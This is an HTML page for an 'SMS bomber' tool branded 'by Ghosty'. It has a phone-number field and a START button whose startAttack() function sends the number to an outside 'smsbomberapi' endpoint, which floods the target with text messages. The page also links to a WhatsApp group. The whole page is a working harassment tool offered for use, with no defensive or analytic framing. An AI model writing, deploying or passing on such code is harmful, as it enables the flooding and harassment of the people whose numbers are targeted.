<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS BOMBER BY GHOSTY</title>

    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            height: 100vh;
            background: url("bg.jpg") no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: rgba(0, 0, 0, 0.65);
            padding: 25px;
            width: 90%;
            max-width: 350px;
            border-radius: 12px;
            text-align: center;
            color: #fff;
            backdrop-filter: blur(6px);
        }

        .title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 15px;
            text-transform: uppercase;
        }

        input {
            width: 90%;
            padding: 10px;
            border-radius: 6px;
            border: none;
            margin-bottom: 12px;
            font-size: 16px;
            outline: none;
        }

        button {
            width: 95%;
            padding: 12px;
            border: none;
            background: #ff0000;
            color: #fff;
            border-radius: 6px;
            font-size: 18px;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .whatsapp {
            background: #25D366;
        }

        #status {
            margin-top: 10px;
            font-size: 15px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="title">SMS BOMBER BY GHOSTY</div>

    <input id="number" type="text" placeholder="Enter Number (e.g 923001234567)">
    
    <button onclick="startAttack()">START</button>

    <button class="whatsapp" onclick="window.location.href='https://chat.whatsapp.com/CPQC5IGJA2m8iaOWOE8CAN?mode=hqrt1'">
        JOIN WHATSAPP GROUP
    </button>

    <div id="status"></div>
</div>

<script>
function startAttack() {
    let num = document.getElementById("number").value;

    if (!num) {
        document.getElementById("status").innerHTML = "⚠️ Please enter a number!";
        return;
    }

    document.getElementById("status").innerHTML = "⏳ Sending...";

    
    let api = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${num}`;

    fetch(api)
        .then(r => r.text())
        .then(d => {
            document.getElementById("status").innerHTML = "✅ Request sent!";
        })
        .catch(err => {
            document.getElementById("status").innerHTML = "❌ Error sending!";
        });
}
</script>

</body>
</html>
